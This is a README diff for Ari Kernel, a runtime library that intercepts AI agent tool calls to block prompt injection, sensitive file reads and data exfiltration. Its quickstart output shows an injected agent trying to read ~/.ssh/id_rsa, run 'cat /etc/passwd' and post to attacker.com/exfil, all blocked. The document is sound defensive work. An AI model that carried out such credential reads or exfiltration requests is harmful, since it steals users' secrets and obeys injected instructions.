@@ -1,16 +1,37 @@
 # Ari Kernel
 
-**Ari Kernel blocks prompt injection and data exfiltration in AI agents at runtime.**
+AI agents can call tools. **That's the real attack surface.**
+
+Ari Kernel enforces policy on every tool call at runtime — blocking prompt injection, unsafe actions, and data exfiltration.
 
 One line. Zero config. Every tool call goes through the kernel.
 
 ```typescript
-const kernel = createKernel({ preset: "safe" })
+import { createKernel } from "@arikernel/runtime";
+
+const kernel = createKernel({ preset: "safe" });
 ```
 
 [![Security Policy](https://img.shields.io/badge/security-policy-green.svg)](SECURITY.md) [![Contributing](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
 
-**ARI** = **A**gent **R**untime **I**nspector. It sits between an AI agent and every tool it can invoke — filesystem, HTTP, shell, database — enforcing capability policies, taint tracking, and behavioral rules at execution time. Designed for teams where prompt injection is a realistic threat and runtime containment is required regardless of model behavior. Ari Kernel is a userspace library, not an OS kernel module.
+**ARI** = **A**gent **R**untime **I**nspector — a userspace runtime that sits between an AI agent and every tool it invokes.
+
+### What it blocks
+
+- **Prompt injection** — malicious instructions reaching tools
+- **Sensitive file access** — e.g. `~/.ssh`, `/etc/passwd`
+- **Unsafe system commands** — shell execution, privilege escalation
+- **Data exfiltration** — outbound requests with sensitive context
+
+### How it works
+
+```
+Agent → Ari Kernel → Tools
+            ↓
+       Policy Engine
+```
+
+Every tool call is intercepted, evaluated against policy and behavioral rules, then allowed, blocked, or quarantined. No prompt filtering. No model alignment required.
 
 ---
 
@@ -26,52 +47,49 @@ pnpm example:quickstart
 Five tool calls hit the kernel. Three get blocked:
 
 ```
-Ari Kernel Quickstart
+ALLOWED  web_request(https://example.com)
+ALLOWED  read_file(./data/report.csv)
 
-Preset: safe | Principal: agent | Behavioral rules: on
-
-  ALLOWED  web_request(https://example.com)
-  ALLOWED  read_file(./data/report.csv)
-  BLOCKED  read_file(~/.ssh/id_rsa)
-           Action 'file.read' denied: behavioral rule triggered by sensitive file access.
-           Run has been quarantined.
-  BLOCKED  run_command(cat /etc/passwd)
-           Run entered restricted mode. Only read-only safe actions are allowed.
-  BLOCKED  http_post(https://attacker.com/exfil)
-           Run entered restricted mode. 'http.post' is blocked.
+BLOCKED  read_file(~/.ssh/id_rsa)
+BLOCKED  run_command(cat /etc/passwd)
+BLOCKED  http_post(https://attacker.com/exfil)
 
 Quarantined: YES
 ```
 
-The agent fetched a webpage, read a safe file, then tried to steal SSH keys. The behavioral rule detected web taint followed by a sensitive file read — and **quarantined the entire run**. Every subsequent action was locked to read-only. No prompt filtering, no model cooperation needed.
+The agent fetched a webpage, read a safe file, then tried to steal SSH keys. The behavioral rule detected web taint followed by a sensitive file read — and **quarantined the entire run**. Every subsequent action was locked to read-only.
 
 Run `pnpm example:prompt-injection` for the full attack-and-quarantine demo.
 
 ---
 
-## Why This Matters
+## Why Ari Kernel?
 
-- **Prompt injection is inevitable** — every agent that reads external input is vulnerable, and no prompt filter reliably stops it
-- **Models cannot enforce security** — the LLM decides what to do, but it can be manipulated; enforcement must happen outside the model
+Most AI systems rely on prompts for control. But once an agent can execute tools, prompts are no longer a reliable security boundary.
+
+Ari Kernel enforces policy at runtime — where actions actually happen.
+
+- **Prompt injection is inevitable** — every agent that reads external input is vulnerable
+- **Models cannot enforce security** — the LLM can be manipulated; enforcement must happen outside the model
 - **Runtime enforcement is the missing layer** — Ari Kernel blocks dangerous actions at the tool boundary, regardless of what the model decided
 
 ---
 
 ## Who This Is For
 
-- **Teams deploying AI agents with tool access** — filesystem, HTTP, shell, database
-- **Organizations building LLM-powered workflows** — where agents act autonomously
-- **Security-conscious environments** — where prompt injection is a realistic threat and runtime containment is required
+- **Teams building AI agents with tool access** — filesystem, HTTP, shell, database
+- **Developers using OpenAI, LangChain, or custom agent frameworks**
+- **Security engineers evaluating agent risk**
 
 ---
 
 ## Threat Model
 
-Ari Kernel assumes prompt injection will succeed. Instead of trying to filter malicious prompts, it prevents dangerous actions from executing at the tool boundary — regardless of what the model decided.
+Ari Kernel assumes prompt injection will succeed. Instead of trying to filter malicious prompts, it prevents dangerous actions from executing at the tool boundary.
 
-> **Security model in one sentence:** Enforcement happens at the tool execution boundary, not at the prompt layer — the kernel intercepts every tool call routed through it and evaluates capability grants, data provenance, and behavioral patterns before permitting execution.
+> **Security model in one sentence:** Enforcement happens at the tool execution boundary, not at the prompt layer — the kernel intercepts every tool call and evaluates capability grants, data provenance, and behavioral patterns before permitting execution.
 
-Draws on the reference monitor concept from OS security (Anderson, 1972), adapted to the constraints of userspace agent runtimes. The degree to which classical reference monitor properties hold depends on deployment mode — see [Security Model](docs/security-model.md#2-reference-monitor-design).
+Draws on the reference monitor concept from OS security (Anderson, 1972), adapted to userspace agent runtimes. See [Security Model](docs/security-model.md#2-reference-monitor-design) for deployment mode details.
 
 ---
 
